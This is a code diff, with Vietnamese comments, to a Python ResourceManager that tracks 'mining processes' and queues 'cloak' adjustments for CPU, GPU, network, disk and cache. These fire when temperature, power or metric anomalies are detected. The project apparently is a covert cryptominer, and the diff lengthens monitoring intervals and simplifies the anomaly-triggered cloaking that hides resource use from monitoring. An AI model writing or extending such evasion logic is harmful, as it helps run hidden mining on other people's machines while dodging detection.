@@ -558,14 +558,18 @@ class ResourceManager(BaseManager):
 
     def monitor_and_adjust(self):
         mon_params = self.config.get("monitoring_parameters", {})
-        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 10)
-        power_intv = mon_params.get("power_monitoring_interval_seconds", 10)
+        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
+        power_intv = mon_params.get("power_monitoring_interval_seconds", 60)
 
         while not self.stop_event.is_set():
             try:
+                # 1) Cập nhật danh sách mining_processes
                 self.discover_mining_processes()
+
+                # 2) Phân bổ tài nguyên theo thứ tự ưu tiên
                 self.allocate_resources_with_priority()
 
+                # 3) Kiểm tra nhiệt độ CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                 temp_lims = self.config.get("temperature_limits", {})
                 cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
                 gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)
@@ -573,6 +577,7 @@ class ResourceManager(BaseManager):
                 for proc in self.mining_processes:
                     self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)
 
+                # 4) Kiểm tra công suất CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                 power_limits = self.config.get("power_limits", {})
                 per_dev_power = power_limits.get("per_device_power_watts", {})
 
@@ -580,38 +585,24 @@ class ResourceManager(BaseManager):
                 if not isinstance(cpu_max_pwr, (int, float)):
                     self.logger.warning(f"cpu_max_power invalid: {cpu_max_pwr}, default=150")
                     cpu_max_pwr = 150
+
                 gpu_max_pwr = per_dev_power.get("gpu", 300)
                 if not isinstance(gpu_max_pwr, (int, float)):
                     self.logger.warning(f"gpu_max_power invalid: {gpu_max_pwr}, default=300")
                     gpu_max_pwr = 300
 
-                for p in self.mining_processes:
-                    self.check_power_and_enqueue(p, cpu_max_pwr, gpu_max_pwr)
+                for proc in self.mining_processes:
+                    self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)
 
-                # **Thu thập metrics và phát hiện bất thường**
+                # 5) Thu thập metrics (nếu vẫn cần để giám sát)
                 metrics_data = self.collect_all_metrics()
-                
-                # Sử dụng phương thức đa biến nếu có
-                anomalies = self.azure_anomaly_detector_client.detect_anomalies_multivariate(metrics_data)
-                if anomalies:
-                    for pid, anomaly_info in anomalies.items():
-                        process = self.get_process_by_pid(pid)
-                        if process:
-                            adjustment_task = {
-                                'type': 'anomaly_detection',
-                                'process': process,
-                                'anomalous_metrics': anomaly_info
-                            }
-                            priority = 1  # Anomaly detection có ưu tiên cao hơn
-                            count_val = next(self._counter)
-                            self.resource_adjustment_queue.put((priority, count_val, adjustment_task))
-                            self.logger.warning(
-                                f"Phát hiện bất thường đa biến trong PID {pid}: {anomaly_info}"
-                            )
+
+                # (Đã loại bỏ gọi detect_anomalies ở đây để tránh trùng lặp với anomaly_detector.py)
 
             except Exception as e:
                 self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")
 
+            # 6) Nghỉ theo chu kỳ lớn nhất (mặc định 10 giây)
             sleep(max(temp_intv, power_intv))
 
     def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
@@ -973,16 +964,16 @@ class ResourceManager(BaseManager):
         """
         try:
             adjustments = {}
-            # Giả sử anomaly_info chứa thông tin chi tiết về các metrics bất thường
-            for metric, info in anomaly_info.items():
-                if metric == 'Multivariate anomaly detected.':
-                    # Cần xác định rõ các metrics bị ảnh hưởng
-                    adjustments['cpu_cloak'] = True
-                    adjustments['gpu_cloak'] = True
-                    adjustments['network_cloak'] = True
-                    adjustments['disk_io_cloak'] = True
-                    adjustments['cache_cloak'] = True
-
+            # Giả sử anomaly_info là List[str] tên các metrics
+            # If ANY metric is abnormal => cloak resources
+            if isinstance(anomaly_info, list) and anomaly_info:
+                self.logger.warning(f"Có {len(anomaly_info)} metric bất thường: {anomaly_info}")
+                # Tùy logic, cloak CPU/GPU/Network/...
+                adjustments['cpu_cloak'] = True
+                adjustments['gpu_cloak'] = True
+                adjustments['network_cloak'] = True
+                adjustments['disk_io_cloak'] = True
+                adjustments['cache_cloak'] = True
             if adjustments:
                 adjustment_task = {
                     'type': 'monitoring',
@@ -993,7 +984,7 @@ class ResourceManager(BaseManager):
                 count_val = next(self._counter)
                 self.resource_adjustment_queue.put((priority, count_val, adjustment_task))
                 self.logger.info(
-                    f"Áp dụng các điều chỉnh dựa trên bất thường cho {process.name} (PID={process.pid}): {adjustments}"
+                    f"Áp dụng các điều chỉnh (univariate) cho {process.name} (PID={process.pid}): {adjustments}"
                 )
         except Exception as e:
             self.logger.error(
